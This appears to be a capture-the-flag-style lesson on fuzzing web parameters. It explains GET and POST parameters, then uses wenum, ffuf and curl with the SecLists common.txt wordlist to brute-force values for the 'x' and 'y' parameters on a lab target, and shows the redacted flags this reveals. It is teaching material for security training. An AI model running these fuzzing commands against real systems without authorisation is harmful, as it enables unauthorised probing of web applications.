## GET Parameters: Openly Sharing Information

```http
https://example.com/search?query=fuzzing&category=security
```

In this URL:

- `query` is a parameter with the value "fuzzing"
- `category` is another parameter with the value "security"
## POST Parameters: Behind-the-Scenes Communication

Here's a simplified example of how a POST request might look when submitting a login form:

```http
POST /login HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

username=your_username&password=your_password
```
## Why Parameters Matter for Fuzzing
## wenum

Let's first ready our tools by installing `wenum` to our attack host:

```shell
3kjS@htb[/htb]$ pipx install git+https://github.com/WebFuzzForge/wenum 
3kjS@htb[/htb]$ pipx runpip wenum install setuptools
```

Then to begin, we will use `curl` to manually interact with the endpoint and gain a better understanding of its behavior:

```shell
3kjS@htb[/htb]$ curl http://IP:PORT/get.php 

Invalid parameter value 
x:
```

The response tells us that the parameter `x` is missing. Let's try adding a value:

```shell
3kjS@htb[/htb]$ curl http://IP:PORT/get.php?x=1 

Invalid parameter value 
x: 1
```

Let's use `wenum` to fuzz the "`x`" parameter's value, starting with the `common.txt` wordlist from SecLists:

```shell
3kjS@htb[/htb]$ wenum -w /usr/share/seclists/Discovery/Web-Content/common.txt --hc 404 -u "http://IP:PORT/get.php?x=FUZZ"

...
 Code    Lines     Words        Size  Method   URL 
...
 200       1 L       1 W        25 B  GET      http://IP:PORT/get.php?x=OA... 

Total time: 0:00:02
Processed Requests: 4731
Filtered Requests: 4730
Requests/s: 1681
```

```shell
200 1 L 1 W 25 B GET http://IP:PORT/get.php?x=OA...
```

If you try accessing `http://IP:PORT/get.php?x=OA...`, you'll see the flag.

```shell
3kjS@htb[/htb]$ curl http://IP:PORT/get.php?x=OA... 

HTB{...}
```
### POST

```shell
3kjS@htb[/htb]$ curl -d "" http://IP:PORT/post.php 

Invalid parameter value 
y:
```

```sh
3kjS@htb[/htb]$ ffuf -u http://IP:PORT/post.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "y=FUZZ" -w /usr/share/seclists/Discovery/Web-Content/common.txt -mc 200 -v
```

Again, you'll see mostly invalid parameter responses. The correct value ("`SU...`") will stand out with its `200 OK` status code:

```sh
000000326: 200 1 L 1 W 26 Ch "SU..."
```

Similarly, after identifying "`SU...`" as the correct value, validate it with `curl`:

```sh
3kjS@htb[/htb]$ curl -d "y=SU..." http://IP:PORT/post.php 

HTB{...}
```
